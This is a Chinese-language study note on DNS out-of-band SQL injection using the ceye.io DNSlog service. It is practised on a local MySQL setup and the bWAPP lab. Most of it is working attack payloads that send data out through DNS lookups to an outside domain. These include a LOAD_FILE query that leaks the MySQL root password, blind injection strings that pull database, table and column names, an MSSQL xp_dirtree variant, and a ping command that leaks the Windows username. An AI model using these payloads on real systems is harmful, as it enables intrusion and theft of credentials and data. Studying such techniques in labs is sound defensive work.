### DNS注入学习 ###
---
<b>简介:</b>
DNS注入就是在注入的时候通过数据库进行DNS查询，将查询到的数据解析到指定的域名。然后查询解析记录从而获取解析的内容

![](http://wenwen.soso.com/p/20110918/20110918090138-1871567267.jpg)


<b>准备:</b>

---
准备：域名（没有域名用） ceye.io
注意：一次传输的数据不能超过128byts，一些特殊字符显示不出来要进行编码处理

我的数据库环境：mysql 5.5.53

首先查询secure_file_priv是否为NULL，如果是load_file就不能加载文件
![](https://s2.ax1x.com/2019/03/18/AmE1Tf.png)

|序号|说明|
|---|-----|
|1|当secure_file_priv为空，就可以读取磁盘的目录|
|2|当secure_file_priv为G:\，就可以读取G盘的文件|
|3|当secure_file_priv为null，load_file就不能加载文件|


修改mysql的my.ini或my.conf在配置文件里面添加
secure_file_priv=''
![](https://s2.ax1x.com/2019/03/18/AmAjFU.png)

去ceye个人页面获取你的二级域名
![](https://s2.ax1x.com/2019/03/18/AmENlj.png)

ceye给出的payload
>SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));

解释:
```mysql
select load_file(concat('\\\\',(你的注入语句)'.xxx.ceye.io\\abc'))
```

ceye给出的payload详情：http://ceye.io/payloads


在mysql命令行插入：
```mysql
select load_file(concat('\\\\',(select hex(user())),'.xxx.ceye.io\\abc'))
```
![](https://s2.ax1x.com/2019/03/18/AmEyhF.png)

ceye查询传输过来的信息
![](https://s2.ax1x.com/2019/03/18/AmERXR.png)

hex解密得到用户名
![](https://s2.ax1x.com/2019/03/18/AmEfn1.png)

使用bwapp的搜索型注入进行盲注获取数据
![](https://s2.ax1x.com/2019/03/18/AmEH9e.png)

注入语句如下：
```mysql
admin%' and(load_file(concat('\\\\',(select database()),'.uqwo37.ceye.io\\abc'))) #
admin%' and(load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema="bwapp" limit 0,1),'.uqwo37.ceye.io\\abc'))) #
admin%' and(load_file(concat('\\\\',(select column_name from information_schema.columns where table_name="blog" limit 0,1),'.uqwo37.ceye.io\\abc'))) #
admin%' and(load_file(concat('\\\\',(select id from blog limit 0,1),'.uqwo37.ceye.io\\abc'))) #
```
![](https://s2.ax1x.com/2019/03/18/AmV8D1.png)

mssql注入
>限制:服务器操作系统为windows
mssql数据库支持master..xp_dirtree存储过程
mssql注入点支持多语句
mssql相对于mysql的优势在于可以执行系统命令，前提条件是需要支持master..xp_cmdshell存储过程
```mssql
DECLARE @host varchar(1024) @host=(你的SQL语句)+'.xxx.ceye.io';EXEC('master..xp_dirtree"\\'+@host+'\foobar$"');
```

<b>命令注入</b>

---
```shell
ping %USERNAME%.uqwo37.ceye.io
```
![](https://s2.ax1x.com/2019/03/18/AmZuZt.png)

学习的文章：
[巧用DNSlog进行注入](https://www.cnblogs.com/afanti/p/8047530.html)


纸上得来终觉浅，绝知此事要躬行